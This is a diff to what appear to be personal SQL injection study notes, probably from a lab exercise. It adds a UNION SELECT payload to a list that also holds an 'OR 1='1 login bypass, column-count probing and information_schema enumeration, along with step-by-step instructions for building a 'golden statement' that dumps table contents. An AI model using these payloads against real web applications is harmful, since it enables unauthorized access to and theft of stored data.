@@ -176,7 +176,7 @@ select carid, type from session.cars ;
 'OR 1='1      #truth statement added to logins to get authentication
 Audi 'UNION SELECT 1,2,3,4 #
 Audi 'UNION SELECT table_schema,2, table_name, column_name,5 from information_schema.columns #
-
+Audi 'UNION SELECT type,2,color,cost,year from session.car #
 ```
 ### Steps for creds
 - 1. input your true bool statement in both fields
@@ -189,6 +189,23 @@ Audi 'UNION SELECT table_schema,2, table_name, column_name,5 from information_sc
 - 1. Identify the vuln field      # ford 'OR 1='1
 - 2. Identify how many columns    # Audi 'UNION SELECT 1,2,3,4 #
 - 3. Edit the golden statement    # build your golden statement to print every column with placeholders in the columns that are mising.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
